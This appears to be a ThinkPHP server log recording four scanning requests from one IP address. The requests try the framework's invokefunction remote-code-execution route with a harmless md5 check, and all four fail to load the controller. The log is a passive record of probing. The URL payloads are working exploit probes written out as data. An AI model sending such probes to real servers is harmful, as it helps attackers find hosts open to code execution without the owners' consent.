[ 2023-03-08T13:23:46+08:00 ] 45.125.34.212 /?s=../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000403s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000470s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000521s ]
ERR: 无法加载控制器:\think\app

[ 2023-03-08T13:23:46+08:00 ] 45.125.34.212 /?s=../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000370s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000473s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000529s ]
ERR: 无法加载控制器:\think\Container

[ 2023-03-08T13:28:15+08:00 ] 45.125.34.212 /?s=../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000514s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000684s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000760s ]
ERR: 无法加载控制器:\think\app

[ 2023-03-08T13:28:15+08:00 ] 45.125.34.212 /?s=../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000642s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000747s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000833s ]
ERR: 无法加载控制器:\think\Container

